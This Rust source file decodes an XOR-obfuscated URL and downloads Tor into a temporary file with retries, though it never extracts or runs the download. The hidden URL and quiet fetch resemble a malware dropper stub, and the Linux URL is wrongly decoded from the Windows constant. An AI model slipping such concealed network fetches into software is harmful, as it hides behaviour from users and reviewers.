mod config;
mod xor;
mod setting;

use std::fs::File;
use std::{io, thread, time, error};

use config::ENC_KEY;
use config::ENC_WINDOWS_URL;

fn main() {
    let setting: setting::Setting = load_settings();

    match download_and_extract_tor(&setting) {
        Ok(()) => {},
        Err(error) => panic!("problem to download and extract tor: {:?}", error)
    };
}

fn download_and_extract_tor(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
    let mut attempts = 0;
    let sleep_time = time::Duration::from_millis(5000);

    let mut file: File = tempfile::tempfile()?;

    loop {
        if attempts > 4 {
            return Result::Err(
                String::from("reached maximum download attempts, aborting").into()
            );
        }

        match download(&setting.windows_url, &mut file) {
            Ok(_) => {
                break;
            },
            Err(err) => {
                println!("download failed with {:?}", err);
                attempts += 1;
            }
        }
        
        thread::sleep(sleep_time);
    };

    Ok(())
}

fn load_settings() -> setting::Setting {
    let key = String::from(ENC_KEY); 

    let windows_url = xor::decode(
        &key, 
        &String::from(ENC_WINDOWS_URL)
    ).unwrap_or_else(|_| {
        panic!("problem unserializing windows url");
    });

    let linux_url = xor::decode(
        &key,
        &String::from(ENC_WINDOWS_URL)
    ).unwrap_or_else(|_| {
        panic!("problem unserializing linux url");
    });

    setting::Setting {
        key,
        windows_url,
        linux_url
    }
}

fn download(url: &String, out_file: &mut File) -> Result<(), ureq::Error> {
    let res = match ureq::get(url).call() {
        Ok(res) => res,
        Err(err) => return Result::Err(err),
    };

    // File buffer to write download data
    let mut writer = io::BufWriter::new(out_file);

    // Download stream reader
    let mut reader = res.into_reader();

    io::copy(&mut reader, &mut writer).unwrap_or_else(|error| {
        panic!("problem writing download to file: {:?}", error);
    });

    Ok(())
}
